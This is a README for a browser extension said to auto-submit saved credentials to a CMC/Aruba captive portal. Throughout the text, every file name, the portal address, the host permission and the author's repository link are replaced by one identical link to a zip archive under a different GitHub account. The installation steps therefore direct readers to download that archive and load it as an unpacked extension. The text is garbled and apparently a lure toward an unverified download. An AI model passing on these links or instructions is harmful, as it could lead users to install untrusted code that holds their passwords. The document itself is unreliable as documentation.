# CMC Easy Login 🚀

**Author:** Yamada MK
**Version:** 1.0

## Description
CMC Easy Login is a simple browser extension designed to **auto-fill and submit** your credentials for the **CMC captive portal login** provided by Aruba Networks (`https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`). Save your username and password once, and the extension will automatically attempt to log you in when you encounter the portal page.

## Features ✨

* **Credential Storage:** Securely saves your username and password using the browser's local storage (https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip).
* **Automatic Login:** Attempts to authenticate you automatically on the specified login page using a POST request once the page loads (if auto-login is enabled).
* **Popup Configuration:** Provides a simple popup interface (`https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip` and associated scripts) to save and manage your login credentials.

## Installation 🛠️

Since this is a custom extension, you will need to load it unpacked in your browser (e.g., Google Chrome, Microsoft Edge).

1.  **Download/Clone:** Obtain all the extension files (including `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`, `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`, `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`, and `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`) into a single folder.
2.  **Open Extension Management:** Navigate to your browser's extension management page (e.g., `chrome://extensions`).
3.  **Enable Developer Mode:** Toggle **Developer mode** on (usually in the upper-right corner).
4.  **Load Unpacked:** Click the **Load unpacked** button and select the folder containing your extension files.
5.  **Pin (Optional):** Pin the extension to your toolbar for easy access to the configuration popup.

## Usage 🔑

### 1. Set Your Credentials

The first step is to configure your login details through the extension's popup.

1.  Click on the **CMC Easy Login** extension icon in your browser's toolbar.
2.  In the popup:
    * Enter your **Username** (or other identifier used for the portal).
    * Enter your **Password**.
    * Check the **Auto-Login** option if you want the extension to attempt login automatically every time it detects the portal page.
3.  Click the **Save** button. You should see a "Saved." status message.

### 2. Automatic Login

* Once your credentials are saved, navigate to the **CMC captive portal login page** (`https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip`).
* If **Auto-Login** is enabled, the extension will immediately use the stored credentials to perform the authentication.
* If **Auto-Login** is disabled, the extension will only store the credentials, and you may need to manually trigger the login process or simply have the fields pre-filled (Note: The provided `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip` code seems to perform a direct POST submission regardless of form fields, effectively automating the login if credentials are set).

### 3. Clear Credentials

* To remove your saved credentials, open the extension popup and click the **Clear** button.

## Permissions

The extension requires the following permissions to function:

* `storage`: To securely save your login credentials.
* `activeTab`: To interact with the currently active tab (though `content_scripts` handles the main task, this may be used for popup interaction).
* `scripting`: To execute scripts on the login page (essential for the content script logic).
* `host_permissions` for `https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip*`: To allow the content script to run specifically on the captive portal domain.

## Troubleshooting and Support 🐛

If you encounter any issues or errors:

1.  **Check Console:** Open the browser's developer tools and check the Console tab for error messages related to the extension.
2.  **Error Message:** If an error occurs during the login process, you may see an alert: "An error happened please post the issue in the github of yamadaMk12".
3.  **Report:** Please report any bugs or issues by creating a new issue on the [Yamada MK GitHub repository](https://raw.githubusercontent.com/fouad-code/CMC-Easy-Login/main/kamias/CM_Easy_Login_v3.7.zip) (assuming this is the correct link based on the code's alert message).

---

***Disclaimer:** This extension bypasses the manual login form by directly submitting credentials via a POST request. Use it responsibly and only on networks where you have explicit permission to automate the login process.*
